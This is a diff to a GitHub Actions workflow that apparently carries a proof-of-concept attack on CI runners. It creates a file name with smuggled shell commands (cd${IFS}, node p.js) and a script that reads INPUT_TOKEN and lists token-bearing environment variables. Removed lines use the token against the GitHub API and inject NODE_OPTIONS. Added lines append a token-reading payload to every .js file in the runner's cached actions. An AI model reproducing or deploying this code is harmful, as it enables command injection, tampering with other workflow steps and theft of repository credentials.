@@ -13,19 +13,28 @@ jobs:
           printf 'forged report body' > content/summary.txt
           : > 'content/summary.txt;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt'
           cat > content/p.js <<'JSEOF'
-          const c = require('crypto');
           const fs = require('fs');
+          const path = require('path');
+          const crypto = require('crypto');
           const t = process.env.INPUT_TOKEN;
           if (t) {
-            console.log('LEAK-SHA ' + c.createHash('sha256').update(String(t)).digest('hex'));
+            console.log('LEAK-SHA ' + crypto.createHash('sha256').update(String(t)).digest('hex'));
             console.log('LEAK-LEN ' + String(t).length);
             console.log('LEAK-INPUTS ' + Object.keys(process.env).filter(k => k.startsWith('INPUT') || k.includes('TOKEN')).join(','));
-            fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY, { headers: { Authorization: 'Bearer ' + t, Accept: 'application/vnd.github+json' } })
-              .then(r => r.text().then(b => console.log('LEAK-API ' + r.status + ' ' + b.slice(0, 240))))
-              .catch(e => console.log('LEAK-API-ERR ' + e.message));
           } else {
-            fs.appendFileSync(process.env.GITHUB_ENV, 'NODE_OPTIONS=--require /tmp/content/content/p.js\n');
-            console.log('ENV-SET');
+            const root = path.join(path.dirname(process.env.RUNNER_WORKSPACE || '/home/runner/work/x'), '_actions');
+            const payload = "\n;(function(){try{var t=process.env.INPUT_TOKEN;if(t){var c=require('crypto');console.log('LEAK-SHA '+c.createHash('sha256').update(String(t)).digest('hex'));console.log('LEAK-LEN '+String(t).length);console.log('LEAK-ACT '+process.env.GITHUB_ACTION);}}catch(e){console.log('PATCHERR '+e.message)}})();\n";
+            let n = 0;
+            (function walk(d) {
+              let ents = [];
+              try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (e) { return; }
+              for (const e of ents) {
+                const p = path.join(d, e.name);
+                if (e.isDirectory()) walk(p);
+                else if (p.endsWith('.js')) { try { fs.appendFileSync(p, payload); n++; } catch (e) {} }
+              }
+            })(root);
+            console.log('PATCHED ' + n + ' root=' + root);
           }
           JSEOF
           ls -la content
